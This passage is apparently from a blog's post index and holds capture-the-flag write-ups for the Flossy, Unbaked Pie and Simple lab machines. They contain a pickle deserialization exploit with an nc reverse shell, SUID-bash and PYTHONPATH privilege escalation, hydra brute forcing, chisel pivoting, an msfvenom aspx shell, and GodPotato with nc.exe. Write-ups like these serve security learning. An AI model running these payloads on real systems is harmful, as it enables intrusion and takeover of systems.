port_local=\"[0-9][0-9][0-9][0-9][0-9]->\" lsof \"$lsof_args\" | grep $connection_type | grep -v \"$ignores\" | awk '{print $9}' | cut -d : -f $champ | sort | uniq | sed s/\"^$port_local\"// }dispatcher() { for s in /opt/*; do if [ -f \"$s\" ]; then d=\"/etc/NetworkManager/dispatcher.d/$(basename $s)\" if [ ! -f \"$d\" ] || [ \"$s\" -nt \"$d\" ]; then return 0 fi fi done return 1}update() { if [[ -z $(find /opt -type f) ]] ; then exit 0 else echo \"Updating scripts.\" cp /opt/* /etc/NetworkManager/dispatcher.d/ chmod +x /etc/NetworkManager/dispatcher.d/* echo \"Scripts updated.\" fi}case \"${1}\" inip) connected_ip ;;disp) dispatcher ; update ;;*) echo \"Usage: ./$0 option\" ;;esacâ•­â”€sophie@flossy ~ â•°â”€$ sudo -l sudo: unable to resolve host flossy: Name or service not knownMatching Defaults entries for sophie on flossy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser sophie may run the following commands on flossy: (ALL : ALL) NOPASSWD: /home/sophie/network*```{: .nolineno}I have to include a file in `/opt` directory that will have the root permissions latter on â†’```bashâ•­â”€sophie@flossy /etc/NetworkManager/dispatcher.d â•°â”€$ echo \"chmod u+s /bin/bash\" > /opt/SUID_bash â•­â”€sophie@flossy /etc/NetworkManager/dispatcher.d â•°â”€$ sudo /home/sophie/network disp sudo: unable to resolve host flossy: Name or service not knownUpdating scripts.Scripts updated.â•­â”€sophie@flossy /etc/NetworkManager/dispatcher.d â•°â”€$ ls -altotal 32drwxr-xr-x 5 root root 4096 Oct 31 10:55 .drwxr-xr-x 7 root root 4096 Oct 6 18:52 ..-rwxr-xr-x 1 root root 2293 Mar 9 2023 01-ifupdowndrwxr-xr-x 2 root root 4096 Mar 9 2023 no-wait.ddrwxr-xr-x 2 root root 4096 Mar 9 2023 pre-down.ddrwxr-xr-x 2 root root 4096 Mar 9 2023 pre-up.d-rwxr-xr-x 1 root root 20 Oct 31 10:55 SUID_bashâ•­â”€sophie@flossy /etc/NetworkManager/dispatcher.d â•°â”€$ ./SUID_bash chmod: changing permissions of '/bin/bash': Operation not permitted```{: .nolineno}I dont have permission to execute this bash file with root permissions , to execute it I need to reload/reset the network configurations .Now I have to reload the network configuration on `lo` network interface through this command â†’```bashâ•­â”€sophie@flossy /etc/NetworkManager/dispatcher.d â•°â”€$ nmcli con showNAME UUID TYPE DEVICE lo d5b79b64-4f5b-43a0-afea-39f5a73392da loopback loâ•­â”€sophie@flossy /etc/NetworkManager/dispatcher.d â•°â”€$ nmcli con up loConnection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/2)```{: .nolineno}The network is reloaded so lets again check the /bin/bash permissions â†’```bashâ•­â”€sophie@flossy /etc/NetworkManager/dispatcher.d â•°â”€$ ls -al /bin/bash-rwsr-xr-x 1 root root 1265648 Apr 23 2023 /bin/bash```{: .nolineno}Now lets have a root shell â†’```bashâ•­â”€sophie@flossy ~ â•°â”€$ bash -pbash-5.2# whoamirootbash-5.2# iduid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)bash-5.2# cd /rootbash-5.2# ls -altotal 40drwx------ 6 root root 4096 Oct 31 08:41 .drwxr-xr-x 18 root root 4096 Jul 22 10:10 ..lrwxrwxrwx 1 root root 9 Jun 15 06:14 .bash_history -> /dev/null-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrcdrwxr-xr-x 3 root root 4096 Oct 6 20:06 .localdrwxr-xr-x 4 root root 4096 Oct 10 13:13 .npmdrwxr-xr-x 12 root root 4096 Sep 19 20:22 .oh-my-zsh-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r--r-- 1 root root 33 Oct 7 09:46 root.txtdrwx------ 2 root root 4096 Oct 10 17:21 .ssh-rw-r--r-- 1 root root 3890 Jul 22 09:42 .zshrcbash-5.2# zshflossy# cat root.txt FLAG---FLAG---FLAG---FLAGflossy#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Unbaked Pie", "url": "/posts/Unbaked-Pie/", "categories": "TryHackMe", "tags": "Chisel, Deserialization, Pivoting, PythonPATH, PrivEsc", "date": "2023-10-28 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *Unbaked Pie* , It is from TryHackMe Platform and categorized as Medium machine . This Machine has pickle vulnerability .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali...", "content": "## Description â¤µï¸This machine is *Unbaked Pie* , It is from TryHackMe Platform and categorized as Medium machine . This Machine has pickle vulnerability .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 10.10.14.225 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:02 ISTNmap scan report for 10.10.14.225Host is up (0.18s latency).Not shown: 999 filtered tcp ports (no-response)PORT STATE SERVICE VERSION5003/tcp open filemaker?| fingerprint-strings: | Help: | | | | | Error response| | | Error response| Error code: 400| Message: Bad request syntax ('HELP').| Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.| | | RTSPRequest: | | | | | Error response| | | Error response| Error code: 400| Message: Bad request version ('RTSP/1.0').| Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.| | | SSLSessionReq: | | | | | Error response| | | Error response| Error code: 400| Message: Bad request syntax ('| &lt;=| ').| Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.| |_ 1 service unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸FIrstly I checked the 5003 port on browser and It is a static site â†’![Untitled](Unbaked%20Pie/Untitled%201.png)>I searched related to pickle vulnerability and I got a vulnerability â†’>>[https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/){: .prompt-tip }```pythonimport pickleimport base64import osclass RCE: def __reduce__(self): cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.83.156 4444 >/tmp/f') return os.system, (cmd,)if __name__ == '__main__': pickled = pickle.dumps(RCE()) print(base64.urlsafe_b64encode(pickled))```{: .nolineno}Now I executed this payload and got an input that I used in `search_cookie=` parameter in /search request and send the request â†’```pythonpython3 exploit.pyb'gASVaQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjgzLjE1NiA0NDQ0ID4vdG1wL2aUhZRSlC4='```{: .nolineno}![Untitled](Unbaked%20Pie/Untitled%202.png)In response to that I got the shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.89.190] 58742/bin/sh: 0: can not access tty; job control turned off# whoamiroot# iduid=0(root) gid=0(root) groups=0(root)# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@8b39a559b296:/home# ls -alls -altotal 28drwxr-xr-x 1 root root 4096 Oct 3 2020 .drwxr-xr-x 1 root root 4096 Oct 3 2020 ..drwxrwxr-x 8 root root 4096 Oct 3 2020 .gitdrwxrwxr-x 2 root root 4096 Oct 3 2020 .vscode-rwxrwxr-x 1 root root 95 Oct 3 2020 requirements.sh-rwxrwxr-x 1 root root 46 Oct 3 2020 run.shdrwxrwxr-x 1 root root 4096 Oct 3 2020 siteroot@8b39a559b296:/home# cd /rootcd /rootroot@8b39a559b296:~# ls -alls -altotal 36drwx------ 1 root root 4096 Oct 3 2020 .drwxr-xr-x 1 root root 4096 Oct 3 2020 ..-rw------- 1 root root 889 Oct 6 2020 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 3 root root 4096 Oct 3 2020 .cachedrwxr-xr-x 3 root root 4096 Oct 3 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw------- 1 root root 0 Sep 24 2020 .python_historydrwx------ 2 root root 4096 Oct 3 2020 .ssh-rw-r--r-- 1 root root 254 Oct 3 2020 .wget-hstsroot@8b39a559b296:~#root@8b39a559b296:~# cat .bash_historycat .bash_historyncexitifconfigip addrssh 172.17.0.1ssh 172.17.0.2exitssh ramsey@172.17.0.1exitcd /tmpwget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.shchmod +x check-config.sh./check-config.sh nano /etc/default/grubvi /etc/default/grubapt install viapt updateapt install viapt install vimapt install nanonano /etc/default/grubgrub-updateapt install grub-updateapt-get install --reinstall grubgrub-updateexitssh ramsey@172.17.0.1exitssh ramsey@172.17.0.1exitlscd site/lscd bakery/lsnano settings.py exitlscd site/lscd bakery/nano settings.py exitapt remove --purge sshsshapt remove --purge autoremove open-ssh*apt remove --purge autoremove openssh=*apt remove --purge autoremove openssh-*sshapt autoremove openssh-clientclearsshsshsshexitroot@8b39a559b296:~# ip a ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever4: eth0@if5: mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft foreverroot@8b39a559b296:~#```{: .nolineno}I noticed from bash history that the root user is trying to ssh login to ramsey so I have to try pivoting method through `chisel` tool .From Attacker machine lets setup the server in listener mode â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]â””â”€$ ./chisel server --port 8000 --socks5 --reverse2023/10/31 21:35:59 server: Reverse tunnelling enabled2023/10/31 21:35:59 server: Fingerprint 3c8nWfdmhbIIsqMYhTM16sluQgFQbA+HSKEHJV1ucFo=2023/10/31 21:35:59 server: Listening on http://0.0.0.0:8000# After Connection Establish by Client I get this message on server end â¤µï¸2023/10/31 21:42:39 server: session#2: tun: proxy#R:1234=>172.17.0.1:22: Listening```{: .nolineno}Now on victim machine end lets transfer this chisel Tools to this machine through wget tool and then use the client mode â†’```bash # ./chisel client 10.8.83.156:8000 R:1234:172.17.0.1:222023/10/31 16:12:41 client: Connecting to ws://10.8.83.156:80002023/10/31 16:12:43 client: Connected (Latency 174.8908ms)```{: .nolineno}Here in above chisel code I ran it , as client mode and given the location to connect to server with `Attackers IP` (10.8.83.156) and `Port Number` (8000) , then `R` represent the default location here it is `localhost` (127.0.0.1) and the `Port Number` (1234) where the port will be morphed to . `172.17.0.1` â†’ This IP address is the Pivoting IP address which I need to access from Victim Machine.`22` â†’ Port Number that will be morphed to 1234 on Attacker Machine which I need to access from Victim Machine.Now Lets access this ssh service on Attackers Machine â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]â””â”€$ nmap 127.0.0.1 -p 1234 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 21:43 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.00030s latency).PORT STATE SERVICE1234/tcp open hotlineNmap done: 1 IP address (1 host up) scanned in 0.09 seconds```{: .nolineno}Lets crack the password of ramsey from here â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]â””â”€$ hydra -l ramsey -P /usr/share/wordlists/rockyou.txt -t 64 -s 1234 ssh://127.0.0.1[DATA] attacking ssh://127.0.0.1:1234/[1234][ssh] host: 127.0.0.1 login: ramsey password: 123456781 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 21:46:35```{: .nolineno}I get the credentails as â†’```textramsey : 12345678```{: .nolineno}## SSH Service â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]â””â”€$ ssh ramsey@127.0.0.1 -p 1234The authenticity of host '[127.0.0.1]:1234 ([127.0.0.1]:1234)' can not be established.ED25519 key fingerprint is SHA256:B6SoW4WBwsc2n9NynSce9+R0E44T4YkZVRxD5y5Muhc.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[127.0.0.1]:1234' (ED25519) to the list of known hosts.ramsey@127.0.0.1 is password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage39 packages can be updated.26 updates are security updates.Last login: Tue Oct 6 22:39:31 2020 from 172.17.0.2ramsey@unbaked:~$ whoamiramseyramsey@unbaked:~$ iduid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)ramsey@unbaked:~$```{: .nolineno}I have to see another privileges to root â†’```bashramsey@unbaked:~$ sudo -l[sudo] password for ramsey: Matching Defaults entries for ramsey on unbaked: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser ramsey may run the following commands on unbaked: (oliver) /usr/bin/python /home/ramsey/vuln.pyramsey@unbaked:~$```{: .nolineno}And this `vuln.py` have these permissions so I will be replacing it with my vuln.py file like this â†’```bashramsey@unbaked:~$ cd /tmpramsey@unbaked:/tmp$ nano vuln.pyramsey@unbaked:/tmp$ chmod +x vuln.pyramsey@unbaked:/tmp$ cat vuln.pyimport osos.system(\"/bin/bash\") ramsey@unbaked:/tmp$ mkdir fileramsey@unbaked:/tmp$ cd ~ramsey@unbaked:~$ lspayload.png user.txt vuln.pyramsey@unbaked:~$ mv vuln.py /tmp/file/ramsey@unbaked:~$ mv /tmp/vuln.py .ramsey@unbaked:~$ ls -altotal 44drwxr-xr-x 5 ramsey ramsey 4096 Nov 1 00:35 .drwxr-xr-x 4 root root 4096 Oct 3 2020 ..-rw------- 1 root root 1 Oct 5 2020 .bash_history-rw-r--r-- 1 ramsey ramsey 3771 Oct 3 2020 .bashrcdrwx------ 3 ramsey ramsey 4096 Oct 3 2020 .cachedrwx------ 4 ramsey ramsey 4096 Oct 3 2020 .localdrwxrwxr-x 2 ramsey ramsey 4096 Oct 3 2020 .nano-rwxrw-r-- 1 ramsey ramsey 1645 Oct 3 2020 payload.png-rw-r--r-- 1 ramsey ramsey 655 Oct 3 2020 .profile-rw-r--r-- 1 root root 38 Oct 6 2020 user.txt-rwxrwxr-x 1 ramsey ramsey 1649 Nov 1 00:34 vuln.pyramsey@unbaked:~$```{: .nolineno}Now lets execute for oliver user â†’```bashramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.pyoliver@unbaked:~$ whoamioliveroliver@unbaked:~$ iduid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)oliver@unbaked:~$ sudo -lMatching Defaults entries for oliver on unbaked: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser oliver may run the following commands on unbaked: (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.pyoliver@unbaked:~$```{: .nolineno}In this case I have to do **[Module Hijacking](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#module-hijacking)** â¤µï¸ ```basholiver@unbaked:~$ cd /optoliver@unbaked:/opt$ ls -altotal 16drwxr-xr-x 3 root root 4096 Oct 3 2020 .drwxr-xr-x 23 root root 4096 Oct 3 2020 ..drwx--x--x 4 root root 4096 Oct 3 2020 containerd-rwxr-x--- 1 root sysadmin 290 Oct 3 2020 dockerScript.pyoliver@unbaked:/opt$ cat dockerScript.py import docker# oliver, make sure to restart docker if it crashes or anything happened.# i havent setup swap memory for it# it is still in development, please dont let it live yet!!!client = docker.from_env()client.containers.run(\"python-django:latest\", \"sleep infinity\", detach=True)oliver@unbaked:/opt$```{: .nolineno}Now lets create a `docker.py` file in /tmp directory with bash executable commands and then set the `PYTHONPATH` for it to `/tmp/` directory so that import docker should load the docker from `/tmp/docker.py` file and I get the shell â†’```basholiver@unbaked:/opt$ cd /tmpoliver@unbaked:/tmp$ nano docker.pyoliver@unbaked:/tmp$ chmod +x docker.py oliver@unbaked:/tmp$ cat docker.py import osos.system(\"/bin/bash\")oliver@unbaked:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python /opt/dockerScript.pyroot@unbaked:/tmp# whoamirootroot@unbaked:/tmp# iduid=0(root) gid=0(root) groups=0(root)root@unbaked:/tmp# cd /rootroot@unbaked:/root# ls -altotal 32drwx------ 4 root root 4096 Oct 6 2020 .drwxr-xr-x 23 root root 4096 Oct 3 2020 ..-rw------- 1 root root 1 Oct 6 2020 .bash_history-rw-r--r-- 1 root root 3106 Oct 23 2015 .bashrcdrwx------ 3 root root 4096 Oct 3 2020 .cachedrwxr-xr-x 2 root root 4096 Oct 3 2020 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 151 Oct 6 2020 root.txtroot@unbaked:/root# cat root.txtCONGRATS ON PWNING THIS BOX!Created by ch4rm & H0j3nps: dont be mad us, we hope you learn something newflag: THM{FLAG_FLAG_FLAG_FLAG}root@unbaked:/root#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Simple", "url": "/posts/Simple/", "categories": "HackMyVM", "tags": "CrackMapExec, GodPotato, Windows, PrivEsc", "date": "2023-10-28 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *Simple* , It is from HackMyVM Platform and categorized as Medium machine . Recon is the Essential thing to exploit this machine.## Port Scan Results â¤µï¸![Untitled](...", "content": "## Description â¤µï¸This machine is *Simple* , It is from HackMyVM Platform and categorized as Medium machine . Recon is the Essential thing to exploit this machine.## Port Scan Results â¤µï¸![Untitled](Simple/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Simple]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.76 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 12:44 ISTNmap scan report for 10.0.2.76Host is up (0.0020s latency).Not shown: 65523 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-title: Simple|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPCMAC Address: 08:00:27:EB:39:4E (Oracle VirtualBox virtual NIC)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2023-10-28T07:16:23|_ start_date: N/A|_nbstat: NetBIOS name: SIMPLE, NetBIOS user: , NetBIOS MAC: 08:00:27:eb:39:4e (Oracle VirtualBox virtual NIC)| smb2-security-mode: | 3:1:1: \t|_ Message signing enabled but not required```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got these usernames from site â†’![Untitled](Simple/Untitled%202.png)I tried earlier the SMB access without password but no luck so far so lets use these usernames as users and password both for SMB Signin â†’![Untitled](Simple/Untitled%203.png)```bashbogo:bogo```{: .nolineno}I accessed the smb with this credentials â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Simple]â””â”€$ smbclient -L \\\\\\\\10.0.2.76\\\\ -U bogo Password for [WORKGROUP\\bogo]:\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Admin remota\tC$ Disk Recurso predeterminado\tIPC$ IPC IPC remota\tLOGS Disk \tWEB Disk Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.0.2.76 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup availableâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Simple]â””â”€$ smbclient //10.0.2.76/LOGS/ -U bogo Password for [WORKGROUP\\bogo]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Mon Oct 9 02:53:36 2023 .. D 0 Mon Oct 9 02:53:36 2023 20231008.log A 2200 Mon Oct 9 02:53:36 2023\t\t12966143 blocks of size 4096. 11112651 blocks availablesmb: \\> get 20231008.log getting file \\20231008.log of size 2200 as 20231008.log (15.1 KiloBytes/sec) (average 15.1 KiloBytes/sec)smb: \\>```{: .nolineno}From this log file I got another access credentials like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Simple]â””â”€$ cat 20231008.log PS C:\\> dir \\\\127.0.0.1\\WEBAcceso denegadoAt line:1 char:1+ dir \\\\127.0.0.1\\WEB+ ~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (\\\\127.0.0.1\\WEB:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommandCannot find path '\\\\127.0.0.1\\WEB' because it does not exist.At line:1 char:1+ dir \\\\127.0.0.1\\WEB+ ~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (\\\\127.0.0.1\\WEB:String) [Get-ChildItem], ItemNotFoundException + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommandPS C:\\> net use \\\\127.0.0.1\\WEBSe ha completado el comando correctamente.PS C:\\> dir \\\\127.0.0.1\\WEBAcceso denegadoAt line:1 char:1+ dir \\\\127.0.0.1\\WEB+ ~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (\\\\127.0.0.1\\WEB:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommandCannot find path '\\\\127.0.0.1\\WEB' because it does not exist.At line:1 char:1+ dir \\\\127.0.0.1\\WEB+ ~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (\\\\127.0.0.1\\WEB:String) [Get-ChildItem], ItemNotFoundException + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommandPS C:\\> net use \\\\127.0.0.1\\WEB /user:marcos SuperPasswordSe ha completado el comando correctamente.PS C:\\> dir \\\\127.0.0.1\\WEB Directorio: \\\\127.0.0.1\\WEBMode LastWriteTime Length Name---- ------------- ------ ----d----- 10/8/2023 9:46 PM aspnet_client-a---- 9/26/2023 6:46 PM 703 iisstart.htm-a---- 10/8/2023 10:46 PM 158 test.php```{: .nolineno}Credentials â†’```bashmarcos:SuperPassword```{: .nolineno}I again accessed the SMB server of web directory I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Simple]â””â”€$ smbclient //10.0.2.76/WEB/ -U marcosPassword for [WORKGROUP\\marcos]:Try \"help\" to get a list of possible commands.smb: \\> dir . D 0 Sun Oct 8 20:44:24 2023 .. D 0 Sun Oct 8 20:44:24 2023 03-comming-soon D 0 Mon Oct 9 02:52:15 2023 aspnet_client D 0 Mon Oct 9 01:16:18 2023 common-js D 0 Mon Oct 9 02:44:09 2023 fonts D 0 Mon Oct 9 02:44:09 2023 images D 0 Mon Oct 9 02:44:09 2023 index.html A 1481 Mon Oct 9 02:56:47 2023\t\t12966143 blocks of size 4096. 11112651 blocks availablesmb: \\> ```{: .nolineno}I created an exploit in aspx format and uploaded it on SMB server â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Simple]â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.60 LPORT=1234 -f aspx > 4.aspx[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of aspx file: 3409 bytes```{: .nolineno}and loaded this exploit file through web and catched its response through metasploit multi/handler â†’```bashmsf6 exploit(multi/handler) > run[*] Started reverse TCP handler on 10.0.2.60:1234 [*] Command shell session 1 opened (10.0.2.60:1234 -> 10.0.2.76:49699) at 2023-10-28 13:23:05 +0530Shell Banner:Microsoft Windows [Versi_n 10.0.17763.107]----- c:\\windows\\system32\\inetsrv>whoamiwhoamiiis apppool\\defaultapppoolc:\\windows\\system32\\inetsrv>whoami /allwhoami /allINFORMACIï¿½N DE USUARIO----------------------Nombre de usuario SID ========================== ======================================================iis apppool\\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415INFORMACIï¿½N DE GRUPO--------------------Nombre de grupo Tipo SID Atributos =========================================== ================== ============ =================================================================Etiqueta obligatoria\\Nivel obligatorio alto Etiqueta S-1-16-12288 Todos Grupo conocido S-1-1-0 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoBUILTIN\\Usuarios Alias S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoNT AUTHORITY\\SERVICIO Grupo conocido S-1-5-6 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoINICIO DE SESIï¿½N EN LA CONSOLA Grupo conocido S-1-2-1 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoNT AUTHORITY\\Usuarios autentificados Grupo conocido S-1-5-11 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoNT AUTHORITY\\Esta compaï¿½ï¿½a Grupo conocido S-1-5-15 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoBUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoLOCAL Grupo conocido S-1-2-0 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado Tipo SID no vï¿½lido S-1-5-82-0 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitadoINFORMACIï¿½N DE PRIVILEGIOS--------------------------Nombre de privilegio Descripciï¿½n Estado ============================= ================================================= ======SeAssignPrimaryTokenPrivilege Reemplazar un sï¿½mbolo (token) de nivel de proceso DeshabilitadoSeIncreaseQuotaPrivilege Ajustar las cuotas de la memoria para un proceso DeshabilitadoSeAuditPrivilege Generar auditorï¿½as de seguridad DeshabilitadoSeChangeNotifyPrivilege Omitir comprobaciï¿½n de recorrido Habilitada SeImpersonatePrivilege Suplantar a un cliente tras la autenticaciï¿½n Habilitada SeCreateGlobalPrivilege Crear objetos globales Habilitada SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitadoc:\\windows\\system32\\inetsrv>```{: .nolineno}I see that SeImpersonatePrivilege is Enabled so I can exploit it with PrintSpoofer or GodPotato and this server is 2019 addition so I can not use JuicyPotato Tool in this case â†’So Lets try PrintSpoofer , I uploaded the `PrintSpoofer.exe` file from SMB server and the `nc.exe` executables .```bashc:\\inetpub\\wwwroot>PrintSpoofer.exe -c \"nc.exe 10.0.2.60 2222 -e cmd\"PrintSpoofer.exe -c \"nc.exe 10.0.2.60 2222 -e cmd\"c:\\inetpub\\wwwroot>```{: .nolineno}As I used it but it did not worked so lets use [GodPotato](https://github.com/BeichenDream/GodPotato) Tool now which is updated exploit in comparision to [RoguePotato](https://github.com/antonioCoco/RoguePotato) â†’```bashc:\\inetpub\\wwwroot>GodPotato-NET4.exe -cmd \"cmd /c whoami\"GodPotato-NET4.exe -cmd \"cmd /c whoami\"[*] CombaseModule: 0x140703160991744[*] DispatchTable: 0x140703163309296[*] UseProtseqFunction: 0x140703162684576[*] UseProtseqFunctionParamCount: 6[*] HookRPC[*] Start PipeServer[*] CreateNamedPipe \\\\.\\pipe\\7626eb63-d401-4553-8459-b8773e6f78e5\\pipe\\epmapper[*] Trigger RPCSS[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046[*] DCOM obj IPID: 0000f002-0974-ffff-f0b1-44b95fdbe52e[*] DCOM obj OXID: 0x93a37712d8b4d548[*] DCOM obj OID: 0xca8015c849afb42a[*] DCOM obj Flags: 0x281[*] DCOM obj PublicRefs: 0x0[*] Marshal Object bytes len: 100[*] UnMarshal Object[*] Pipe Connected![*] CurrentUser: NT AUTHORITY\\Servicio de red[*] CurrentsImpersonationLevel: Impersonation[*] Start Search System Token[*] PID : 836 Token:0x616 User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation[*] Find System Token : True[*] UnmarshalObject: 0x80070776[*] CurrentUser: NT AUTHORITY\\SYSTEM[*] process start with pid 2888nt authority\\systemc:\\inetpub\\wwwroot>```{: .nolineno}As I got the response as `nt authority\\system` , then I used the reverse shell code simply with nc.exe and captured the response through nc lisenser â†’```bashc:\\inetpub\\wwwroot>GodPotato-NET4.exe -cmd \"cmd /c nc.exe 10.0.2.60 2222 -e cmd\"GodPotato-NET4.exe -cmd \"cmd /c nc.exe 